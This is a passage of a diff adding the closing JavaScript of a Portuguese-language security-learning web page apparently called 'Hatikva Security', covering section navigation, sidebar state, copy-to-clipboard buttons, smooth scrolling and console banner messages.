+            const targetSection = document.getElementById('section-' + section);
+            if (targetSection) {
+                targetSection.classList.remove('section-hidden');
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            } else {
+                // Fallback para home se seção não existir
+                document.getElementById('section-home').classList.remove('section-hidden');
+            }
+
+            // Atualizar sidebar ativo
+            document.querySelectorAll('.sidebar-item').forEach(item => {
+                item.classList.remove('active');
+            });
+
+            // Marcar item ativo (encontrar pelo onclick)
+            const allSidebarItems = document.querySelectorAll('.sidebar-item');
+            allSidebarItems.forEach(item => {
+                if (item.getAttribute('onclick') && item.getAttribute('onclick').includes(section)) {
+                    item.classList.add('active');
+                }
+            });
+
+            // Se não encontrou, marcar o primeiro item do grupo
+            if (!document.querySelector('.sidebar-item.active')) {
+                document.querySelector('.sidebar-item').classList.add('active');
+            }
+        }
+
+        // Copiar código
+        function copyCode(button) {
+            const codeBlock = button.parentElement;
+            const code = codeBlock.textContent
+                .replace(/Copiar/g, '')
+                .replace(/❯/g, '')
+                .trim();
+
+            navigator.clipboard.writeText(code).then(() => {
+                const modal = new bootstrap.Modal(document.getElementById('copyModal'));
+                modal.show();
+
+                const originalHTML = button.innerHTML;
+                button.innerHTML = '<i class="fas fa-check me-1"></i>Copiado!';
+                button.style.background = 'linear-gradient(135deg, #00d084, #00ff9f)';
+
+                setTimeout(() => {
+                    button.innerHTML = originalHTML;
+                    button.style.background = '';
+                }, 2000);
+            }).catch(() => {
+                alert('Erro ao copiar. Copie manualmente.');
+            });
+        }
+
+        // Marcar como concluído
+        function markCompleted(section) {
+            alert('Módulo "' + section + '" marcado como concluído! ✅');
+        }
+
+        // Sidebar navigation
+        document.querySelectorAll('.sidebar-item').forEach(item => {
+            item.addEventListener('click', function() {
+                document.querySelectorAll('.sidebar-item').forEach(i => {
+                    i.classList.remove('active');
+                });
+                this.classList.add('active');
+            });
+        });
+
+        // Smooth scroll
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                const href = this.getAttribute('href');
+                if (href !== '#') {
+                    e.preventDefault();
+                    const target = document.querySelector(href);
+                    if (target) {
+                        target.scrollIntoView({
+                            behavior: 'smooth',
+                            block: 'start'
+                        });
+                    }
+                }
+            });
+        });
+
+        // Easter egg no console
+        console.log('%c🔒 HATIKVA SECURITY 🔒', 'color: #d21034; font-size: 24px; font-weight: bold;');
+        console.log('%c⚠️ Use este conhecimento com responsabilidade!', 'color: #ffc107; font-size: 14px;');
+        console.log('%cDesenvolvido por @migalth', 'color: #0038b8; font-size: 12px;');
+        console.log('%cPlataforma focada em Termux e Linux', 'color: #00d084; font-size: 12px;');
+
+        // Persistir estado da seção
+        document.addEventListener('DOMContentLoaded', function() {
+            const savedSection = localStorage.getItem('hatikva-section') || 'home';
+            navigateTo(savedSection);
+
+            // Salvar seção ao navegar
+            document.querySelectorAll('.sidebar-item, .nav-link').forEach(item => {
+                item.addEventListener('click', function() {
+                    const section = this.getAttribute('onclick')?.match(/navigateTo\('(.+)'\)/)?.[1];
+                    if (section) {
+                        localStorage.setItem('hatikva-section', section);
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
